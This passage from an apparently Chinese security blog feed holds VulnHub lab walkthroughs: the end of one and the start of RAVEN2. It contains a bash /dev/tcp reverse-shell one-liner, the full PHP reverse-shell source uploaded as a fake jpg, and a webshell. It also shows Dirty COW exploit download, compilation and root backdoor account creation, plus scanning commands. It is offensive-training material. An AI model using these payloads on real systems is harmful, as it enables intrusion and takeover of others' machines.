src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626173407715.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626173407715.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626173407715"></p><p>kali开个nc监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><blockquote><p>用nvlp参数没弹回来，因为lvvp用于反向连接，常用（用于还未拿到主机shell）</p><p>nvlp为监听连接，用于已经拿下主机的shell，再反弹shell，别用，弹不回来，害人</p></blockquote><p>直接反弹shell，文件内容改为下列：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.101.128&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = 4444;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&quot; /bin/bash&quot;</span> ;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;&#123;<span class="variable">$shell</span>&#125; -i &gt;&amp; /dev/tcp/&#123;<span class="variable">$ip</span>&#125;/&#123;<span class="variable">$port</span>&#125; 0&gt;&amp;1&quot;</span>;</span><br><span class="line"><span class="built_in">exec</span> ( <span class="variable">$cmd</span> ) ;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>为什么这个马弹不回来，是因为是文件包含的吗，看到的师傅给个答案</p><p>用kali自带的php反向连接马，路径在<code>/usr/share/webshells/php/php-reverse-shell.php</code>，修改一下ip和port，转为jpg上传，上传后包含一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.101.128&#x27;</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;       <span class="comment">// CHANGE THIS</span></span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; /bin/sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line"><span class="comment">// Fork and have the parent process exit</span></span><br><span class="line"><span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the current process a session leader</span></span><br><span class="line"><span class="comment">// Will only succeed if we forked</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Change to a safe directory</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Remove any umask we inherited</span></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Do the reverse shell...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spawn shell process</span></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Set everything to non-blocking</span></span><br><span class="line"><span class="comment">// Reason: Occsionally reads will block, even though stream_select tells us they won&#x27;t</span></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// Check for end of TCP connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check for end of STDOUT</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Wait until a command is end down $sock, or some</span></span><br><span class="line"><span class="comment">// command output is available on STDOUT or STDERR</span></span><br><span class="line"><span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the TCP socket, send</span></span><br><span class="line"><span class="comment">// data to process&#x27;s STDIN</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDOUT</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we can read from the process&#x27;s STDERR</span></span><br><span class="line"><span class="comment">// send data down tcp connection</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line"><span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Like print, but does nothing if we&#x27;ve daemonised ourself</span></span><br><span class="line"><span class="comment">// (I can&#x27;t figure out how to redirect STDOUT like a proper daemon)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>弹回shell，权限为www-data</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626181105938.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626181105938.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626181105938"></p><p>使用python弹回标准shell：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092501762.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092501762.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627092501762"></p><p>或者传一句话马，蚁剑添加数据，并设置httpbody为post数据</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091025994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091025994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627091025994"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091040024.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091040024.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627091040024"></p><p>蚁剑连接成功：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091335571.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091335571.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627091335571"></p><h3 id="（3）脏牛提权"><a href="#（3）脏牛提权" class="headerlink" title="（3）脏牛提权"></a>（3）脏牛提权</h3><p><code>uname -a</code>发现linux内核为2.6.35</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091730882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627091730882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627091730882"></p><p><strong>脏牛提权适用的linux Kernel范围</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.6.22 &lt;= Linux kernel &lt;= 3.9</span><br></pre></td></tr></table></figure><p>所以该提权方式适用范围很广，到2016年才修复该漏洞</p><p>先看一下目标机有无gcc:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -v</span><br></pre></td></tr></table></figure><p>有gcc，且版本为4.6.3</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093520949.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093520949.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627093520949"></p><ul><li>攻击机开启web服务，在github上下载脏牛的exp或者<code>searchsploit Dirty</code>：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dirtycow exp:https://github.com/FireFart/dirtycow</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092620126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627092620126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627092620126"></p><p>复制到本地并用python开启web服务(python2和python3不一样)：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /usr/share/exploitdb/exploits/linux/local/40839.c .</span><br><span class="line">python2 -m SimpleHttpServer 8000</span><br><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093353738.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093353738.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627093353738"></p><p>目标机上下载exp并进行编译：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.101.128:8000/40839.c</span><br></pre></td></tr></table></figure><p>报错，显示该目录无写权限</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093743542.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093743542.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627093743542"></p><p>转到<code>/tmp</code>目录重新下载，下载成功：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093931310.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627093931310.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627093931310"></p><p>编译执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure><blockquote><p>-pthread 表示启用POSIX线程库，用于支持多线程编程</p><p>-o 指定生成后的文件</p><p>-lcrypt 连接ctypt库，用于支持密码加密算法</p></blockquote><p>成功生成&#x2F;tmp&#x2F;passwd.bak后门，并提示输入新密码</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094407212.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094407212.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627094407212"></p><p>输入自己想要的后门密码，可以用该账户登录了：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094617075.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094617075.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627094617075"></p><ul><li>登录特权账户：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su firefart</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094719791.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094719791.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627094719791"></p><ul><li>查看权限：</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094745563.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094745563.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627094745563"></p><ul><li>在&#x2F;root&#x2F;root.txt找到flag:</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094857813.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230627094857813.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230627094857813"></p><p>flag:&#x3D;&#x3D;8f420533b79076cc99e9f95a1a4e5568&#x3D;&#x3D;</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶机渗透RAVEN2</title>
      <link href="/2023/06/28/vulnhub-ba-ji-raven2/"/>
      <url>/2023/06/28/vulnhub-ba-ji-raven2/</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>资产编号</th><th>资产分类</th><th>资产名称</th><th>资产规格</th><th>访问地址</th><th>备注&#x2F;问题</th></tr></thead><tbody><tr><td>RAVEN1</td><td>主机系统</td><td>Ubuntu操作系统</td><td>Type:Linux<br />IP:192.168.101.134<br />Port:22、80、111</td><td>192.168.101.134</td><td>敏感目录泄露，PHPMailer低版本参数注入漏洞，UDF+find命令提权</td></tr></tbody></table><p>靶机flag:</p><p>&#x3D;&#x3D;flag1{b9bbcb33e11b80be759c4e844862482d}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag2{6a8ed560f0b5358ecf844108048eb337}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag3{a0f568aa9de277887f37730d71520d9b}&#x3D;&#x3D;</p><p>&#x3D;&#x3D;flag4{df2bc5e951d91581467bb9a2a8ff4425}&#x3D;&#x3D;</p><p>靶机下载地址：<a href="https://download.vulnhub.com/raven/Raven2.ova">https://download.vulnhub.com/raven/Raven2.ova</a></p><p>kali攻击机ip为192.168.101.128</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230624215915330"></p><h3 id="RAVEN-2靶机"><a href="#RAVEN-2靶机" class="headerlink" title="RAVEN 2靶机"></a>RAVEN 2靶机</h3><h3 id="（1）信息收集"><a href="#（1）信息收集" class="headerlink" title="（1）信息收集"></a>（1）信息收集</h3><ul><li>通过netdiscover进行二层发现，发现地址为192.168.101.134主机</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.101.0/24</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102437077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626102437077"></p><ul><li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.134</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102542459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626102542459"></p><ul><li>通过masscan四层发现目标主机开放端口</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.134</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102724962.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230626102724962"></p><p>目标主机开启了111服务端口，22ssh端口，49505端口</p><ul><li><p>扫描目标端口服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.134 -oN nmap.A</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230626102846814.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 